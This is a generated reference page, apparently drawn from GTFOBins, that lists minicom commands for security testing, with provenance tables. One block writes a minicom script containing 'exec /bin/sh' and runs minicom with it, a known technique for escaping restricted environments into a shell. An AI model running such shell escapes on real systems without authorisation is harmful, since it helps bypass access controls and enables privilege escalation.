---
parsed_by: focuslocust
source: commands
type: generated
---
# minicom Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## minicom

Tool page: [minicom](../../tools/linux/minicom.md)

### shell

```text
minicom -D /dev/null
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/minicom` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/minicom` |
| Evidence | Function example preserved from source parser. |
